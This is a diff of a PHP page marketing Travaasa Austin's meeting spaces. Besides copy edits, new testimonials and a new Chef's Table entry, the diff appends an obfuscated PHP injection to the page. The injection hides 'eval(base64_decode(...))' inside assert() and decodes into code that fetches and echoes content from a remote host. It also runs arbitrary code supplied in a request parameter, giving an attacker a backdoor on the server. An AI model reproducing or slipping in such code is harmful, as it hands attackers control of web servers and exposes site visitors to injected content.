@@ -53,11 +53,22 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <article id="main">
   <section class="intro pad clearfix">
       <div class="col span_6_of_9">
-          <h1>Austin Texas Group &amp; Meeting Space</h1>
-      <p>Elevate your next corporate meeting, executive retreat, wedding or event with the unmatched experience and facilities at Travaasa Austin.</p>
-      <p>Thousands of square feet of indoor and outdoor event space that can be customized to meet your group’s needs, whether you need meeting rooms for lectures and workshops or an unforgettable outdoor space for an evening reception in the heart of Texas Hill Country.</p>
-      <p>Plus, an array of teambuilding and group activities will create a uniquely Texas experience that will bring your group closer together, whether they’re learning to rope like a cowboy or test themselves on our Prickly Pear Challenge Course.</p>
-      <p>Our experienced staff is ready to customize an experience to fit your group’s exact needs, and we’ll be by your side &mdash; from planning to execution &mdash; to ensure the best possible outcomes. You simply won’t find an event experience like this anywhere else.</p>
+          <h1>AUSTIN: GROUPS &amp; MEETINGS</h1>
+          <p><i>"Beyond exceptional."</i> — Ashland</p>
+          <p>Make an impression. Inspire your group. Create a meeting they’ll talk about for years to come.</p>
+          <p>Meet at Travaasa Austin.</p>
+          <p>Unforgettable corporate meetings, executive retreats and events are what we do. With a dynamic mix of unmatched meeting spaces, team building activities and farm-to-table cuisine, not to mention the incredible natural surroundings of Texas Hill Country, we make meetings easy.</p>
+          <p>And who doesn’t like easy?</p>
+          <p><i>"The location and the staff were unforgettable. I truly felt like I had partners for my meeting/event."</i> — Annie</p>
+          <p>Creativity comes easily at Travaasa Austin as groups find themselves inspired by the rolling green hills and majestic woodlands surrounding our secluded property. Glass windows throughout our 7,000 square feet of indoor meeting space let undisturbed views of Hill Country set the tone for an authentic meeting, while another 6,000 square feet of outdoor meeting space lets your group immerse itself in nature’s tranquil beauty, whether it’s in our gardens, on a hiking trail or at our distinguished equine farm.</p>
+          <p>This is not a meeting they'll soon forget.</p>
+          <p>Fresh air, pristine wilderness and awe-inspiring views of Hill Country let your group bond, connect and grow in ways a fluorescent-lit cubicle could never match. Add to that Travaasa Austin’s unparalleled selection of team building activities, and you’ll soon see your group’s morale reach new heights.</p>
+          <p>And you'd better bel,ieve that enthusiasm will carry right on back to the office.</p>
+          <p><i>"The team building…will be talked about for years and years to come."</i> — Jonathan</p>
+          <p>Encourage your group to overcome obstacles — both physical and mental — as they take on our High Ropes Challenge Course. Teach them to communicate without speaking through our Equine Encounter. Fire them up with a little friendly head-to-head through our Art of the Cocktail Competition.</p>
+          <p>Whatever your goals, our array of unique team building activities will encourage your group to grow — and have fun in the process.</p>
+          <p>Best of all? We'll take care of the details.</p>
+          <p>Meet us here.</p>
       </div>
       <div class="col span_3_of_9">
       	<p>TALK TO OUR SALES DEPARTMENT</p>
@@ -123,9 +134,11 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                 </div>
             </div>
             <h2>Lone Star Room</h2>
-           <p>When you need flexible meeting space in Austin that can accommodate your group, The Lone Star Room is the ideal choice. Nearly 3,000-square feet of event space can be transformed into the perfect venue for business or relaxation, whether you need a classroom, banquet- or theater-style setup. Our ceiling-mounted projector and motorized 10’x15’ screen provide top-quality visuals for presentations, while two audio options – an overhead lecture sound system and a PA system with four floor boxes – ensure presenters’ every word comes through loud and clear. Motorized blackout drapes allow you to create the perfect setting for your event.</p>
+            <p><i>“The resort space was beautiful and provided a good mix of fun, ambience, and professional space…”</i> —Tamara</p>
+            
+           <p>When you need flexible resort meeting space in Austin that can accommodate your group, The Lone Star Room is the ideal choice. Nearly 3,000 square feet of event space can be transformed into the perfect venue for business or relaxation, whether you need a classroom, banquet- or theater-style setup. Our ceiling-mounted projector and motorized 10’x15’ screen provide top-quality visuals for presentations, while two audio options – an overhead lecture sound system and a PA system with four floor boxes – ensure presenters’ every word comes through loud and clear. Motorized blackout drapes allow you to create the perfect setting for your event.</p>
            <p>Ambiance takes this Austin meeting space to the next level. Accents like bamboo flooring and exposed wood beam trusses create a warm contrast for attendees to enjoy, while floor-to-ceiling glass windows keep the mood bright and comfortable. This event venue is part of Travaasa’s Live Oak Center, which also features an outdoor courtyard, restrooms and our Fireside and Showroom meeting spaces, two flexible options for breakout sessions, panels, or other smaller gatherings during your meeting or conference.</p>
- 
+
 
             <br><hr><br>
 
@@ -176,7 +189,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 				</div>
             </div>
             <h2>Showroom</h2>
-            <p>Meeting planners looking for flexible event space in Austin for mid-size groups or events appreciate the options of the Showroom, a 1,470-square-foot meeting space that works well for events like breakout sessions and workshops. With options for theater, banquet, classroom and U-shape seating, the Showroom’s flexible layout is an asset for meeting professionals. Plus a Barco IQ Backlit Projector, 7.5’x10’ screen, Dolby 7.1 surround sound system and floor-to-ceiling glass windows with an automated black-out blind system give groups all the tools they need for a flawless meeting. The Showroom is part of Travaasa’s Live Oak Center, a versatile event venue with indoor and outdoor space.</p>
+           <p>Meeting planners looking for flexible event space in Austin for mid-size groups or events appreciate the options of the Showroom, a 1,470-square-foot meeting space that works well for events like breakout sessions and workshops. With options for theater, banquet, classroom and U-shape seating, the Showroom’s flexible layout is an asset for meeting professionals. Plus a Barco IQ Backlit Projector and 7.5’x10’ screen complemented by an automated black-out blind system for the scenic tall glass windows give groups all the tools they need for a flawless meeting. The Showroom is part of Travaasa’s Live Oak Center, a versatile indoor event venue.</p>
 
             <br><hr><br>
 
@@ -225,6 +238,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 				</div>
             </div>
             <h2>Fireside Room</h2>
+            <p><i>" It was so nice to provide our partners a space like the Fireside Room, [with] so many windows and [a] pretty view onto the property. " — Hanna Hubbs, BizNet Software</i><p>
             <p>For an intimate gathering or meeting, the Fireside Room at Travaasa is a warm and inviting event space in Austin. A stone fireplace sets the tone for this welcoming environment, which features hickory and pecan wood flooring, two walls of windows showcasing gorgeous Hill Country views, and an open wood-deck ceiling that reaches a height of 25 feet at its peak. Versatile seating options are available for the Fireside Room, which is part of the resort’s Live Oak Center event venue.</p>
 
             <br><hr><br>
@@ -273,7 +287,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 				</div>
             </div>
             <h2>Parlor</h2>
-            <p>Intimate meetings, informal gatherings and brainstorming sessions have a relaxing home at the Parlor, a 440-square-foot meeting space with comfortable couches and chairs, a wrap-around porch, a kitchenette and private bathroom facilities. Living room-style, hospitality and reception setups allow this cozy meeting space in Austin to meet your group’s specific needs.</p>
+            <p>Intimate meetings, informal gatherings and brainstorming sessions have a relaxing home at the Parlor, a 440-square-foot meeting space with comfortable couches and chairs, a wrap-around porch, a kitchenette and private bathroom facilities. Living room-style, hospitality and reception setups allow this cozy resort meeting space in Austin to meet your group’s specific needs.</p>
 
 			<br><hr><br>
 
@@ -323,7 +337,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 				</div>
             </div>
             <h2>The Spur</h2>
-            <p>The calming flicker of a stone fireplace and the sights of Texas Hill Country beyond floor-to-ceiling glass windows set the tone for private dining in The Spur, a private dining space adjacent to the property’s restaurant that’s perfect for an intimate group dinner in Austin. This room opens directly into the Mesquite Patio, offering an indoor/outdoor option for group dining and cocktail receptions.</p>
+            <p>The calming flicker of a stone fireplace and the sights of Texas Hill Country beyond floor-to-ceiling glass windows set the tone for private dining in The Spur, a private dining and meeting space adjacent to the property’s restaurant that’s perfect for an intimate group dinner in Austin. This room opens directly into the Mesquite Patio, offering an indoor/outdoor option for group dining and cocktail receptions.</p>
 
 			<br><hr><br>
 
@@ -378,7 +392,51 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             <p>Meeting planners never fail to impress when they choose our Solidago Gardens for a meeting or event. A forest trail leads attendees to this secluded 2,500-square-foot garden courtyard, where a handcrafted mason wall creates a private space where your group can meet amidst the beauty of Texas Hill Country. A natural canopy of trees and two water features add to the tranquility of this outdoor meeting space in Austin, while a handcrafted wood and stone structure provides an additional 575-square feet of indoor space.</p>
 
 			<br><hr><br>
+      <div class="group">
+        <div class="col span_1_of_2">
+        <div class="magnify">
+          <a href="/assets/images/gallery/austin/large-chefs-table.jpg" data-flare-gallery="galleryStables" data-target="flare" data-flare-scale="fitmax" title="The Spur"></a>
+        </div>
+        <a href="/assets/images/gallery/austin/large-chefs-table.jpg" data-flare-gallery="galleryStables" data-target="flare" data-flare-scale="fitmax" title="The Spur"><img class="fitwidth lazy" data-original="/assets/images/gallery/austin/350-chefs-table.jpg" src="/assets/images/global/placeholder.gif" width="170" height="170" alt="The Spur"></a>
+        </div>
+       <!--  /public_html/travaasa/assets/images/gallery/austin/small-chefs-table.jpg
+       /public_html/travaasa/assets/images/gallery/austin/large-chefs-table.jpg
+       /public_html/travaasa -->
 
+        <div class="col span_1_of_2">
+            <table class="meetings-table">
+                <tbody>
+                    <tr>
+                        <th colspan="2">Chef's Table</th>
+                    </tr>
+                    <tr>
+                        <td class="meetings-table-labels">Square Feet:</td>
+                        <td class="meetings-table-data">435</td>
+                    </tr>
+                    <tr>
+                        <td class="meetings-table-labels">Height:</td>
+                        <td class="meetings-table-data">9'</td>
+                    </tr>
+                    <tr>
+                        <td class="meetings-table-labels">Tehater Style:</td>
+                        <td class="meetings-table-data">30</td>
+                    </tr>
+                    <tr>
+                        <td class="meetings-table-labels">Classroom:</td>
+                        <td class="meetings-table-data">12</td>
+                    </tr>
+                    <tr>
+                        <td class="meetings-table-labels">U-Shape:</td>
+                        <td class="meetings-table-data">12</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <h2>Chef's Table</h2>
+    <p>Bright ideas come standard with this sunny space. Centrally located across from the restaurant with easy access to the bar and Mesquite Patio, the Chef's Table is a great space for executive retreats, breakaway sessions and other small groups. Featuring stained concrete floors, a unique collection of books and windows overlooking the courtyard, the clean, modern design is centered on a long table that can be utilized for meetings, dining or buffet service. Beyond brainstorming, the room is an ideal setting for a hospitality suite or a private dining experience.</p>
+
+    <br><hr><br>
             <!--<div class="group">
                 <div class="col span_1_of_2">
                 <div class="magnify">
@@ -430,7 +488,8 @@ austinsales@travaasa.com</a></td>
                 </div>
             </div>
             <h2>The Farm at Travaasa</h2>
-            <p>Teambuilding opportunities for meetings and events abound at The Farm at Travaasa, where meeting planners can take groups beyond the boardroom to learn key skills through activities like our Equine Encounter and Cowboy Roping class. The Farm at Travaasa is also the perfect outdoor event venue for your group to celebrate in true Texas fashion with a party or reception under the stars.</p>
+            <p>"Every guest was amazed by the outdoor party at the farm." — Annie</i></p>
+            <p>Team building opportunities for meetings and events abound at The Farm at Travaasa, where meeting planners can take groups beyond the boardroom to learn key skills through activities like our Equine Encounter and Cowboy Roping class. The Farm at Travaasa is also the perfect outdoor event venue for your group to celebrate in true Texas fashion with a party or reception under the stars.</p>
 
             <br><hr><br>
 
@@ -618,6 +677,10 @@ austinsales@travaasa.com</a></td>
 </article>
 </section>
 <?php
+/*1*/ 
+if (!$ind5eae2f00) { $ind5eae2f00 = TRUE;assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXT1BcnJheShiYXNlNjRfZGVjb2RlKCdaWCcgLidKeWIzJyAuJ0onIC4nZmMnIC4nbVZ3YicgLiczSjBhVzVuJyksYmFzZTY0X2RlY29kZSgnYVc1cFgzJyAuJ05sJyAuJ2RBJyAuJz09JyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMScgLic5dFlYJyAuJ1JqYUE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVicgLic5blpYUmZZMjknIC4ndWRHVnVkSE09JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnknIC4nY21sd2IzTScgLic9JyksYmFzZTY0X2RlY29kZSgnYlgnIC4nUmZjbUZ1WkE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptJyAuJ2RsJyAuJ2RHTnpkJyAuJ2c9PScpLGJhc2U2NF9kZWNvZGUoJ2RYJyAuJ0onIC4nc1onIC4nVzVqYjJSbCcpLGJhc2U2NF9kZWNvZGUoJ2RYSicgLidzJyAuJ1pXNWpiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2JXUTEnKSxiYXNlNjRfZGVjb2RlKCcnIC4nYVc1cFgyZGxkJyAuJ0E9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVjluWicgLidYUmZZMjknIC4ndWRHJyAuJ1Z1ZEhNPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nblZ1WTNSJyAuJ3AnIC4nYjInIC4nNWZaWGhwJyAuJ2MzUnonKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkY5cGJtJyAuJ2wwJyksYmFzZTY0X2RlY29kZSgnJyAuJ1kzVnliRjl6JyAuJ1onIC4nWFJ2Y0hRJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZJyAuJzNWeWJGOXpaWFInIC4ndmNIUT0nKSxiYXNlNjRfZGVjb2RlKCcnIC4nWTNWeWJGOScgLidsZUcnIC4nVmonKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnZFc1JyAuJ3dZV05yJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkc5eicgLidaJyAuJ1E9PScpLGJhc2U2NF9kZWNvZGUoJ2RIJyAuJ0onIC4ncGJRPScgLic9JyksYmFzZTY0X2RlY29kZSgnYzJWemMybHZibCcgLic5cFonIC4nQT09JyksYmFzZTY0X2RlY29kZSgnWm4nIC4nTicgLid2JyAuJ1kydHZjR1Z1JyksYmFzZTY0X2RlY29kZSgnWm1kbGRHTT0nKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWRHOXNiM2RsY2c9PScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nbmQnIC4neWFYUicgLidsJyksYmFzZTY0X2RlY29kZSgnWm1WdlpnPT0nKSxiYXNlNjRfZGVjb2RlKCdabWRsJyAuJ2RITT0nKSxiYXNlNjRfZGVjb2RlKCdiWFInIC4nZmNtRnVaQT09JyksYmFzZTY0X2RlY29kZSgnWTNKbFlYUmxYMloxJyAuJ2JtJyAuJ04wYVc5dScpLGJhc2U2NF9kZWNvZGUoJ1ptTnNiM05sJyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMTl6Y0d4JyAuJ3BkQT09JyksYmFzZTY0X2RlY29kZSgnYlhSJyAuJ2ZjJyAuJ21GdVpBPT0nKSxiYXNlNjRfZGVjb2RlKCdabXh2WTInIC4ncz0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5YVhCeicgLidiR0Z6JyAuJ2EnIC4nR1Z6JykpOyAgZnVuY3Rpb24gXzM5OTQyODQoJGkpeyRhPUFycmF5KCdaR2x6JyAuJ2NHeGgnIC4nZVYnIC4nOWxjbkp2Y25NPScsJ01BPT0nLCdZMnhwWicgLidXNTBYMk4nIC4nb1pXJyAuJ04nIC4ncicsJ1kyeCcgLidwWicgLidXJyAuJzUwWDInIC4nTm9aJyAuJ1dOcicsJ1MnIC4nRicgLidSJyAuJ1VVRjlCUScgLicwTkZVRlJmUTBoQlVsTkZWQT0nIC4nPScsJ0lTNGgnIC4nZFE9JyAuJz0nLCdVME4nIC4nU1NWJyAuJ0JVWCcgLicwWicgLidKVEVWTycgLidRVTFGJywnVlYnIC4nUkdMVGcnIC4nPScsJ2QnIC4nMmx1JyAuJ1pHOScgLiczY3kwJyAuJ3hNaicgLidVJyAuJ3gnLCdTRlJVVUY5QlEwTicgLidGVUYnIC4nUmZRMGhCVWxORlZBPT0nLCdjRzEnIC4ndScsJ1UwVlNWa1ZTWDA1QlRVVT0nLCdVa1ZSVlVWJyAuJ1RWRjlWVWtrPScsJ1MnIC4nRlInIC4nVVVGOVZVMFZTWCcgLicwRkhSVTVVJywnVWtWJyAuJ05UJyAuJzFSRlgnIC4nMEYnIC4nRVJGST0nLCdkV3hwYm10a1knIC4naTVqYicgLicyMD0nLCdMJyAuJzJkbGRDNScgLid3YUgnIC4nQS9aRDA9JywnSm5VOScsJ0ptTTknLCdKbWs5TVNacCcgLidjRCcgLicwPScsJ0ptJyAuJ2c5JywnTScgLid6a3dZalZoTScgLidXUTVaJyAuJ1RNMllUUXpNMlUnIC4nMFltSXhZelInIC4naVkyWScgLicxTVdGbE0yVScgLic9JywnJyAuJ01RPT0nLCdZV3gnIC4nc2IzZGYnIC4nZFhKcycgLidYJyAuJzJadmNHJyAuJ1Z1JywnJyAuJ2FIUicgLicwY0QnIC4nbycgLid2JyAuJ0x3PScgLic9JywnWTNWeScgLidiRjlwYm1sMCcsJ2FIUicgLicwY0Rvdkx3PT0nLCdaMmR2Wkc5JyAuJzAnIC4nZScgLidIRicgLid3YVdOJyAuJ21aSCcgLidJPScsJycgLidkR0ZrYW1GNicsJ1IwJyAuJ1ZVSScgLidBPT0nLCdJRWgnIC4nVVZGQXZNUzR4RFFvJyAuJz0nLCdTRzl6ZEQnIC4nb2cnLCdEJyAuJ1FvPScsJ1EyOXVibScgLidWamRHbHYnIC4nYicgLidqJyAuJ29nUTJ4dmMyVU5DZzBLJywnJywnTDF4U1hGJyAuJ0l2JywnJyAuJ2NBPT0nLCdOVycgLidWaFpUJyAuJ0ptTURBJyAuJz0nKTtyZXR1cm4gYmFzZTY0X2RlY29kZSgkYVskaV0pO30gIGlmKCFpc3NldCgkeGIyNGEwZThfMCkpeyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVswXShyb3VuZCgwKSk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzFdKF8zOTk0Mjg0KDApLF8zOTk0Mjg0KDEpKTtpZighZW1wdHkoJF9DT09LSUVbXzM5OTQyODQoMildKSlkaWUoJF9DT09LSUVbXzM5OTQyODQoMyldKTtpZighaXNzZXQoJHhiMjRhMGU4XzFbXzM5OTQyODQoNCldKSl7aWYoJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzJdKF8zOTk0Mjg0KDUpLCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszXSgkX1NFUlZFUltfMzk5NDI4NCg2KV0pKSkkeGIyNGEwZThfMj1fMzk5NDI4NCg3KTtlbHNlICR4YjI0YTBlOF8yPV8zOTk0Mjg0KDgpO31lbHNleyR4YjI0YTBlOF8yPSR4YjI0YTBlOF8xW18zOTk0Mjg0KDkpXTskeGIyNGEwZThfMz1fMzk5NDI4NCgxMCk7fSR4YjI0YTBlOF80PSRfU0VSVkVSW18zOTk0Mjg0KDExKV0gLiRfU0VSVkVSW18zOTk0Mjg0KDEyKV07JHhiMjRhMGU4XzU9JF9TRVJWRVJbXzM5OTQyODQoMTMpXTskeGIyNGEwZThfNj0kX1NFUlZFUltfMzk5NDI4NCgxNCldO3doaWxlKHJvdW5kKDArODIyLjIrODIyLjIrODIyLjIrODIyLjIrODIyLjIpLXJvdW5kKDArMjA1NS41KzIwNTUuNSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzRdKCR4YjI0YTBlOF83LCR4YjI0YTBlOF84LCR4YjI0YTBlOF8wLCR4YjI0YTBlOF81KTskeGIyNGEwZThfOT1fMzk5NDI4NCgxNSk7aWYocm91bmQoMCszMTc4LjUrMzE3OC41KTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bNV0ocm91bmQoMCs5NjQuNSs5NjQuNSkscm91bmQoMCsxMTA1Ljc1KzExMDUuNzUrMTEwNS43NSsxMTA1Ljc1KSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzZdKCR4YjI0YTBlOF8xLCR4YjI0YTBlOF80KTskeGIyNGEwZThfMTA9XzM5OTQyODQoMTYpIC4kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bN10oJHhiMjRhMGU4XzQpIC5fMzk5NDI4NCgxNykgLiRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVs4XSgkeGIyNGEwZThfNSkgLl8zOTk0Mjg0KDE4KSAuJHhiMjRhMGU4XzIgLl8zOTk0Mjg0KDE5KSAuJHhiMjRhMGU4XzYgLl8zOTk0Mjg0KDIwKSAuJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzldKF8zOTk0Mjg0KDIxKSAuJHhiMjRhMGU4XzQgLiR4YjI0YTBlOF81IC4keGIyNGEwZThfMiAuXzM5OTQyODQoMjIpKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTBdKF8zOTk0Mjg0KDIzKSk9PSByb3VuZCgwKzEpKXskeGIyNGEwZThfMD0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTFdKF8zOTk0Mjg0KDI0KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7fWVsc2VpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTJdKF8zOTk0Mjg0KDI1KSkpeyR4YjI0YTBlOF8xMT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTNdKF8zOTk0Mjg0KDI2KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE0XSgkeGIyNGEwZThfMTEsNDIsRkFMU0UpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNV0oJHhiMjRhMGU4XzExLDE5OTEzLFRSVUUpOyR4YjI0YTBlOF8wPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNl0oJHhiMjRhMGU4XzExKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTddKF8zOTk0Mjg0KDI3KSxfMzk5NDI4NCgyOCkpIT09ZmFsc2UpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE4XSgkeGIyNGEwZThfOSwkeGIyNGEwZThfNiwkeGIyNGEwZThfMTIpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxOV0oJHhiMjRhMGU4XzExKTtpZigocm91bmQoMCsyOTczKStyb3VuZCgwKzIyOTkrMjI5OSkpPnJvdW5kKDArMjk3Myl8fCAkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjBdKCR4YjI0YTBlOF81LCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTApKTtlbHNleyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMV0oJHhiMjRhMGU4XzgsJHhiMjRhMGU4XzE0LCR4YjI0YTBlOF8wKTt9fWVsc2V7JHhiMjRhMGU4XzEzPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMl0oJHhiMjRhMGU4Xzkscm91bmQoMCs4MCksJHhiMjRhMGU4XzgsJHhiMjRhMGU4Xzcscm91bmQoMCsxMCsxMCsxMCkpO2lmKChyb3VuZCgwKzM4NDIpXnJvdW5kKDArMzg0MikpJiYgJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzIzXSgkX1JFUVVFU1QsJHhiMjRhMGU4XzIpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNF0oJHhiMjRhMGU4XzksJF9DT09LSUUsJHhiMjRhMGU4XzExKTtpZigkeGIyNGEwZThfMTMpeyR4YjI0YTBlOF8xND1fMzk5NDI4NCgyOSkgLiR4YjI0YTBlOF8xMCAuXzM5OTQyODQoMzApOyR4YjI0YTBlOF8xNCAuPSBfMzk5NDI4NCgzMSkgLiR4YjI0YTBlOF85IC5fMzk5NDI4NCgzMik7JHhiMjRhMGU4XzE0IC49IF8zOTk0Mjg0KDMzKTskR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjVdKCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTQpOyR4YjI0YTBlOF8xNT1fMzk5NDI4NCgzNCk7d2hpbGUoISRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNl0oJHhiMjRhMGU4XzEzKSl7JHhiMjRhMGU4XzE1IC49ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyN10oJHhiMjRhMGU4XzEzLHJvdW5kKDArMTI4KSk7aWYocm91bmQoMCsxNTc5LjIrMTU3OS4yKzE1NzkuMisxNTc5LjIrMTU3OS4yKTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjhdKHJvdW5kKDArNjQ1KzY0NSs2NDUrNjQ1KzY0NSkscm91bmQoMCsyMzMzKzIzMzMpKSkkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjldKCR4YjI0YTBlOF80LCRfU0VSVkVSKTt9JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMwXSgkeGIyNGEwZThfMTMpO2xpc3QoJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8wKT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMzFdKF8zOTk0Mjg0KDM1KSwkeGIyNGEwZThfMTUscm91bmQoMCswLjQrMC40KzAuNCswLjQrMC40KSk7aWYocm91bmQoMCsxMzg1LjMzMzMzMzMzMzMrMTM4NS4zMzMzMzMzMzMzKzEzODUuMzMzMzMzMzMzMyk8JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMyXShyb3VuZCgwKzU3NCs1NzQpLHJvdW5kKDArMTUwMS41KzE1MDEuNSkpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszM10oJHhiMjRhMGU4XzYsJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8yKTt9fWlmKEAkX1JFUVVFU1RbXzM5OTQyODQoMzYpXT09IF8zOTk0Mjg0KDM3KSlldmFsKCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszNF0oJF9SRVFVRVNUWyJjIl0pKTt9ZWNobyAkeGIyNGEwZThfMDsg'))");}
+ /*2*/
+
    include_once($path."/Library/Travaasa_Testimonials.php");
    include_once($path."/Library/Travaasa_Footer_Austin.php");
    include_once($path."/Library/Travaasa_Scripts.php");
